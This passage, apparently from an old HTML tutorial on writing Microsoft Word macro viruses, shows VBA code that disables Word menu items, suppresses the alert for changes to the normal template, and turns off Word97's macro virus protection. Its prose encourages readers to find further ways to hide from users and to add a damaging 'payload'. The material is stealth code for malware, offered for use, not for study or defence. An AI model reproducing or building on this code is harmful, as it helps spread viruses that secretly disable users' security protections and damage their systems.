size=2><BR>CommandBars("View").Controls("Toolbars").Enabled = False </FONT><FONT face=Verdana color=#008040 size=2>' etc...</FONT><FONT face=Verdana size=2><BR>CommandBars("View").Controls("Status Bar").Enabled = False </FONT><FONT face=Verdana color=#008040 size=2>' i got these from xde</FONT><FONT face=Verdana size=2><BR>CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False<BR>CommandBars("Format").Controls("Style...").Enabled = False<BR>NormalTemplate.Saved = True</FONT><FONT face=Verdana size=1> </FONT><FONT face=Verdana color=#008040 size=1>' </FONT><FONT face=Verdana color=#008040 size=2>if you make a change to normaltemplate, don't alert user</FONT><FONT face=Verdana size=1><BR></FONT><FONT face=Verdana size=2>Options.VirusProtection = False </FONT><FONT face=Verdana color=#008040 size=2>' very important in word97, enable macros without alert in future</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>There are a lot of other ways to hide from users, but I'll leave them to you (you can search on <A href=http://www.google.com/ target=_blank>google</A> for them etc.). But what is the use of all these methods, if you're virus doesn't do anything, if it's just like a worm.</P><H3>Making a payload</H3><P>A payload is the part what makes a virus a virus. It's the pain in your belly when you have the flue. You can come up with a number of things. From just a simple alert to something really great. I'll also will leave this to you, because i'm tired of explaining this :).</P><P>My thanks goto: All those people who have written tutorials about virusses and ordinary stuff.</P><P>ps: During the last hour an annoying fly has been circling above my head, now i'm going to get up and smash it!</P>